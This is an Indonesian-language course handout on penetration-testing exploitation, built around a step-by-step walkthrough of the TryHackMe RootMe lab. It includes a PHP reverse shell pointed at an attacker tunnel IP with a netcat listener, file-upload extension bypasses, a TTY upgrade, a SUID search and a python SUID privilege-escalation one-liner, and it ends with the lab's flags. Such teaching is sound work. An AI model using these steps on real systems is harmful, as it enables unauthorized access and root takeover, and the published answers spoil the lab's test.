# pertemuan 4

Selamat datang di pertemuan keempat sekaligus **pertemuan terakhir dalam materi Cyber Security** di **IT CLUB Cyber**! 🎉  \
Pada sesi ini, kita akan membahas salah satu tahap paling seru dalam **penetration testing**, yaitu **Exploitation**.  \
Eksploitasi adalah proses memanfaatkan kelemahan yang ditemukan pada sistem untuk mendapatkan akses yang lebih dalam. Di dunia pentesting, tahap ini adalah kunci untuk memahami bagaimana serangan bekerja dan bagaimana kita bisa melindungi sistem dari ancaman nyata.  \

## 🔹 Apa yang Akan Kita Pelajari?
- Mengenal konsep dasar **Exploitation** dalam keamanan siber.
- Memahami berbagai **teknik eksploitasi** seperti **Command Injection**, **Privilege Escalation**, dan **Reverse Shell**.
- Menerapkan eksploitasi dalam **TryHackMe RootMe**, sebuah lab yang dirancang untuk pemula agar bisa mencoba teknik hacking secara langsung.

> **⚠️ Disclaimer:** Eksploitasi hanya boleh dilakukan dalam lingkungan yang diizinkan seperti TryHackMe. Jangan gunakan teknik ini untuk tujuan ilegal! 🚨  

## 🔍 Tahapan Penetration Testing
Sebelum masuk ke eksploitasi, mari kita pahami kembali **tahapan dalam penetration testing (pentest)**:  

1. **Information Gathering** – Mengumpulkan informasi sebanyak mungkin tentang target.  
2. **Vulnerability Analysis** – Menganalisis sistem untuk menemukan potensi kerentanan.  
3. **Exploitation** – Mengeksploitasi kelemahan untuk mendapatkan akses ke sistem.  
4. **Post-Exploitation** – Menentukan dampak dari eksploitasi dan mempertahankan akses.  
5. **Reporting** – Mendokumentasikan hasil dan memberikan rekomendasi mitigasi.  

## 💥 Exploitation
**Exploitation** adalah serangkaian kode, perintah, atau teknik yang memanfaatkan **kerentanan (vulnerability)** dalam suatu sistem, aplikasi, atau jaringan untuk:  
- **Mendapatkan akses tidak sah** ke sistem.  
- **Meningkatkan hak istimewa** (privilege escalation).  
- **Menyebabkan sistem menjadi tidak berfungsi** (Denial of Service - DoS).  

> ⚠️ **Gunakan eksploitasi untuk pembelajaran seperti di tantangan CTF, dan jangan disalahgunakan!**  

---

## 🔥 Jenis-Jenis Exploit
1. **Remote Exploit** 🛰️  
   - Menyerang sistem dari jarak jauh tanpa akses langsung ke perangkat target.  
   - Contoh: Serangan terhadap layanan web atau server yang terbuka di internet.  

2. **Local Exploit** 💻  
   - Mengharuskan penyerang memiliki akses awal ke sistem sebelum bisa mengeksploitasi kelemahan.  
   - Contoh: **Privilege Escalation** setelah mendapatkan akses awal.  

---

## 🎯 Tujuan Exploitation
1. **Maintaining Access** 🔓  
   - Memasang **backdoor**, **rootkit**, atau malware lainnya untuk mempertahankan akses kembali ke sistem.  

2. **Privilege Escalation** ⚡  
   - Meningkatkan hak istimewa dari **pengguna biasa** menjadi **administrator/root** untuk mengontrol lebih banyak aspek sistem.  

3. **Covering Tracks** 🕵️  
   - Menghapus **log aktivitas**, mengubah **timestamp**, atau menggunakan teknik lain untuk menghilangkan jejak eksploitasi.  

---

## 🏴‍☠️ Post Exploitation
**Post-Exploitation** adalah proses yang terjadi setelah penyerang berhasil mendapatkan akses ke sistem atau jaringan target. Pada tahap ini, penyerang akan:  
- Menentukan **seberapa dalam** eksploitasi bisa dilakukan.  
- Mengakses dan mencuri **data sensitif**.  
- Menyebarkan eksploitasi ke sistem lain dalam jaringan.  

> ⚠️ **Gunakan eksploitasi untuk pembelajaran seperti di tantangan CTF, dan jangan disalahgunakan!**  

## 🚀 TryHackMe - RootMe
**TryHackMe** adalah platform pembelajaran keamanan siber berbasis cloud yang menyediakan berbagai tantangan **Capture The Flag (CTF)** dan simulasi serangan keamanan untuk meningkatkan keterampilan ethical hacking.  

Untuk memulai dengan **RootMe**, ikuti langkah berikut:  
1. **Kunjungi TryHackMe** di [https://tryhackme.com](https://tryhackme.com).  
2. **Daftar (Signup) dan Login** jika belum memiliki akun.  
3. **Buka Room RootMe** melalui tautan berikut:  
   🔗 [https://tryhackme.com/r/room/rrootme](https://tryhackme.com/r/room/rrootme).  
4. Ikuti petunjuk dan tantangan untuk menyelesaikan eksploitasi pertama kamu.  

---

# 🎮 How to Play TryHackMe
TryHackMe menyediakan dua cara utama untuk menjalankan latihan:  

## 🖥️ **AttackBox**
- Mesin virtual berbasis web yang sudah dikonfigurasi dengan semua alat yang dibutuhkan untuk CTF dan eksploitasi.  
- Tidak perlu instalasi tambahan di perangkat lokal.  

## 🌐 **OpenVPN**
- Menghubungkan perangkat lokal ke jaringan TryHackMe untuk mengakses lab yang lebih kompleks.  
- Membutuhkan file konfigurasi VPN yang bisa diunduh dari **TryHackMe Access Page**.  

---
### ⚙️ Akses Tanpa VPN
Jika tidak menggunakan VPN, infrastruktur TryHackMe terdiri dari beberapa **server lab** yang bisa diakses langsung melalui **AttackBox** atau jaringan publik.  

Dalam mode ini, koneksi langsung dilakukan dari **laptop** ke server **TryHackMe**, lalu diteruskan ke **lab-lab virtual** tanpa melalui jaringan VPN.

**Topologi jaringan TryHackMe tanpa VPN:**  
![alt text](docs/images/9.png) 

### 🔗 Akses Dengan VPN
Jika menggunakan VPN, laptop akan terhubung terlebih dahulu ke jaringan **VPN TryHackMe** sebelum mengakses lab-lab virtual. Hal ini memungkinkan akses yang lebih aman dan lebih banyak tantangan yang memerlukan jaringan internal.

**Topologi jaringan TryHackMe dengan VPN:**  
![alt text](docs/images/10.png)

---
## how to use vpn
### 1. Instalasi OpenVPN
Untuk menggunakan OpenVPN di Linux, jalankan perintah berikut:
```bash
sudo apt update && sudo apt install openvpn -y
```

### 2. Download File Konfigurasi VPN
- Masuk ke akun TryHackMe
- buka halaman "Access" di TryHackMe atau gunakan link berikut:👉 [TryHackMe Access Room](https://tryhackme.com/r/access)
- Download file **.ovpn**

### 3. Menghubungkan ke VPN
- Pindah ke folder tempat file .ovpn disimpan
  ```bash
  cd ~/Downloads/
  ```
- Jalankan OpenVPN dengan file konfigurasi yang sudah diunduh
  ```bash
  sudo openvpn <nama_file>.ovpn
  ```
  Contoh jika file bernama tryhackme.ovpn:
  ```bash
  sudo openvpn tryhackme.ovpn
  ```

---
# tryhackme root me
- desc: A ctf for beginners, can you root me?
- url : [https://tryhackme.com/r/room/rrootme](https://tryhackme.com/r/room/rrootme)

# docs
- [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
- [https://gtfobins.github.io/gtfobins/python/#suid](https://gtfobins.github.io/gtfobins/python/#suid)

# Solve (Visual)
## information gathering
- **Check the Open Ports** \
Langkah pertama adalah memeriksa port yang terbuka pada target dengan menggunakan alat seperti nmap. Berikut adalah hasil dari pemindaian port:
![alt text](docs/images/image.png)
- **Check the Versions and Vulnerabilities** \
Setelah mengetahui port yang terbuka, langkah berikutnya adalah memeriksa versi layanan yang berjalan pada port tersebut untuk mencari potensi **CVE (Common Vulnerabilities and Exposures)** atau kerentanannya.
- **Directory Discovery (Finding Hidden Directories and Files)** \
Langkah berikutnya adalah mencari direktori atau file yang tersembunyi pada server menggunakan tools seperti gobuster, dirsearch, atau dirbuster. Hal ini membantu untuk menemukan area tersembunyi yang mungkin memiliki potensi kerentanannya.
![alt text](docs/images/image-1.png)
  - **Explore the Found Directories** \
    Setelah menemukan direktori yang menarik, kamu bisa mencoba untuk mengaksesnya secara manual melalui browser atau menggunakan tools seperti curl untuk mengeksplorasi lebih lanjut. Di tahap ini, kamu akan mencari potensi untuk melakukan exploitation atau privilege escalation.
    ![alt text](docs/images/image-2.png)
    ![alt text](docs/images/image-3.png)
  - **Explore the /panel Directory**
Direktori **/panel** mungkin adalah panel admin atau area untuk melakukan upload file

## exploit
- **Web Shell Upload**
Web shell upload adalah tindakan meng-upload file berbahaya (umumnya skrip PHP, ASP, atau lainnya) yang dapat dieksekusi di server untuk mendapatkan akses dan kontrol
  - **download the file** [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell)
  - **Check IP Tunnel**: Untuk mengetahui IP tunnel yang kamu miliki, misalnya **10.21.78.122**, kamu bisa menggunakan perintah **ip a** atau **ip addr show tun0** di server. IP ini adalah alamat dari interface yang kamu gunakan untuk tunneling. 
    ![alt text](docs/images/image-4.png)
  - **Edit File PHP**: Buka file php-reverse-shell.php yang telah diunduh di editor teks atau IDE favoritmu. \
  **Ubah IP dan Port**: Temukan bagian berikut dalam skrip tersebut:
    ```bash
    $ip = '10.21.78.122';  // IP Dari Interface yang kamu miliki (tun0)
    $port = 9001;       // Port yang ingin kamu Listen
    ```
    ![alt text](docs/images/image-5.png)
  - **Set Up Listener**: Di sisi penyerang, kamu perlu menyiapkan listener untuk mendengarkan koneksi masuk. Kamu bisa menggunakan netcat untuk mendengarkan koneksi pada port yang sama yang kamu tentukan dalam skrip PHP. Di terminal, jalankan:
    ```bash
    nc -lvnp 9001
    ```
    Perintah di atas akan membuat server mendengarkan pada port 9001.
    ![alt text](docs/images/image-6.png)
  - **Upload Web Shell ke Server**: Jika server yang kamu tuju rentan terhadap upload file, kamu dapat meng-upload file PHP yang telah dimodifikasi tersebut melalui mekanisme upload file yang ada di aplikasi web target (seperti form upload file atau eksploitasi file upload yang lemah).
    ![alt text](docs/images/image-7.png)
    Namun, jika upaya upload langsung gagal karena pembatasan jenis file, kamu dapat melanjutkan dengan teknik Bypassing File Type Restrictions.
  - **Bypassing file type restrictions**: Mengubah ekstensi file atau menyamarkan file agar server menganggapnya sebagai file yang sah (misalnya mengubah .php2, .php3, .asp, .phtml, .txt, atau ekstensi lain yang tidak diblokir.) atau Menggunakan trik lain seperti menambahkan ekstensi ganda (misalnya shell.php.jpg), atau menyembunyikan file PHP di dalam file gambar dengan mengubah metadata.
    ![alt text](docs/images/image-8.png)
    ![alt text](docs/images/image-9.png)
  - **Eksekusi Web Shell**: Setelah file di-upload dan dieksekusi di server target, shell akan mencoba menghubungi IP dan port yang telah kamu tentukan. Jika semuanya berhasil, kamu akan mendapatkan akses ke shell server yang dapat digunakan untuk menjalankan perintah.
    - php2 berhasil upload, namun RCE gagal:
    ![alt text](docs/images/image-10.png)
    - php5 berhasil upload dan RCE berhasil:
    ![alt text](docs/images/image-11.png)
    Jika kamu ingin memulai listener atau melakukan reverse shell, pastikan untuk membuka file PHP-nya terlebih dahulu agar backdoor dapat berjalan dengan baik.

## post exploit
Setelah berhasil mendapatkan akses ke server melalui web shell, langkah selanjutnya adalah mengoptimalkan akses yang telah diperoleh untuk mendapatkan kontrol lebih dalam terhadap sistem target. Berikut beberapa langkah yang dapat dilakukan dalam tahap post exploit: \
- **Upgrade TTY Agar Interaktif (Opsional)**: Kadang-kadang, akses shell yang kamu dapatkan tidak sepenuhnya interaktif, yang berarti kamu mungkin tidak bisa menjalankan perintah dengan lancar. Dalam hal ini, kamu bisa melakukan upgrade TTY untuk mendapatkan sesi shell yang lebih stabil dan interaktif.
  ![alt text](docs/images/image-12.png)
  ![alt text](docs/images/image-16.png)
- **Mencari SUID, SUDO, dan Akses Privilege Lainnya**
  - **Mencari File SUID (Set User ID)** File yang memiliki bit SUID memungkinkan eksekusi file dengan hak akses pemiliknya, yang seringkali bisa digunakan untuk eskalasi hak akses (privilege escalation). Untuk mencari file SUID di sistem.
  ![alt text](docs/images/image-13.png)
  - **Mencari Sudoers yang Bisa Dijalankan Tanpa Password**: Jika akun yang kamu gunakan memiliki akses sudo, kamu dapat mencari tahu perintah-perintah apa yang bisa dijalankan tanpa memerlukan password. Gunakan perintah berikut untuk melihat hak akses sudo:
- **Lakukan Eksploitasi jika Sudah Ditemukan**
  Jika kamu menemukan file dengan bit SUID atau perintah yang bisa dijalankan tanpa password, kamu dapat melanjutkan dengan eksploitasi untuk meningkatkan hak akses dan mendapatkan kontrol lebih besar di sistem target.
  ![alt text](docs/images/image-14.png)
  ![alt text](docs/images/image-15.png)


# Solve (Text-Based)
## information gathering
```bash
: '[+] setup'
ip=10.10.62.155
tun=10.21.78.122

: '[+] nmap'
nmap -p- -T4 $ip # check all port opened
# Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 17:30 WIB
# Nmap scan report for 10.10.62.155 (10.10.62.155)
# Host is up (0.21s latency).
# Not shown: 65533 closed tcp ports (reset)
# PORT   STATE SERVICE
# 22/tcp open  ssh
# 80/tcp open  http

# Nmap done: 1 IP address (1 host up) scanned in 355.97 seconds

nmap -sCV -p22,80 $ip -oN nmap # check the version for each port opened
# Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 17:32 WIB
# Nmap scan report for 10.10.62.155 (10.10.62.155)
# Host is up (0.21s latency).

# PORT   STATE SERVICE VERSION
# 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
# | ssh-hostkey: 
# |   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
# |   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
# |_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
# 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
# | http-cookie-flags: 
# |   /: 
# |     PHPSESSID: 
# |_      httponly flag not set
# |_http-title: HackIT - Home
# |_http-server-header: Apache/2.4.29 (Ubuntu)
# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done: 1 IP address (1 host up) scanned in 14.54 seconds

: '[+] whatweb'
whatweb http://$ip
# http://10.10.62.155 [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.62.155], Script, Title[HackIT - Home]

: '[+] Directory Discovery (gobuster, dirsearch, dirbuster(gui))'
gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o dir
# /uploads              (Status: 301) [Size: 314] [--> http://10.10.62.155/uploads/]
# /css                  (Status: 301) [Size: 310] [--> http://10.10.62.155/css/]
# /js                   (Status: 301) [Size: 309] [--> http://10.10.62.155/js/]
# /panel                (Status: 301) [Size: 312] [--> http://10.10.62.155/panel/]

dirsearch -u http://$ip -e all -o dir
```

## exploit
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php

ip a # check the interface tun0
vi php-reverse-shell.php
: 'ubah bagian ini'
# $ip = '10.21.78.122';  // CHANGE THIS
# $port = 9001;       // CHANGE THIS

: 'upload the file to /panel'
# seharusnya akan gagal

cp php-reverse-shell.php sh.php2; cp php-reverse-shell.php sh.php3; cp php-reverse-shell.php sh.php5
# lalu coba bypass dengan mengubah extensionya sepertti php3, php5, dll dan lakukan upload seharusnya berhasil

: 'listen'
nc -lvnp 9001
```

## post exploit
```bash
: 'upgrade tty'
python -c 'import pty; pty.spawn("/bin/bash")'
# CTRL + Z
stty raw -echo; fg
export TERM=xterm

: 'suid'
find / -type f -user root -perm -4000 2>/dev/null
# /usr/lib/dbus-1.0/dbus-daemon-launch-helper
# /usr/lib/snapd/snap-confine
# /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
# /usr/lib/eject/dmcrypt-get-device
# /usr/lib/openssh/ssh-keysign
# /usr/lib/policykit-1/polkit-agent-helper-1
# /usr/bin/traceroute6.iputils
# /usr/bin/newuidmap
# /usr/bin/newgidmap
# /usr/bin/chsh
# /usr/bin/python
# /usr/bin/chfn
# /usr/bin/gpasswd
# /usr/bin/sudo
# /usr/bin/newgrp
# /usr/bin/passwd
# /usr/bin/pkexec

: 'Jika Menemukan SUID atau Sudoers yang Rentan, langkah selanjutnya adalah mencari eksploitasi yang relevan dengan menggunakan GTFOBins.'
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

# answer
- Task 1
- Task 2
  - 2
  - 2.4.29
  - ssh
  - /panel/
- Task 3
  - THM{y0u_g0t_a_sh3ll}
- Task 4
  - /usr/bin/python
  - THM{pr1v1l3g3_3sc4l4t10n}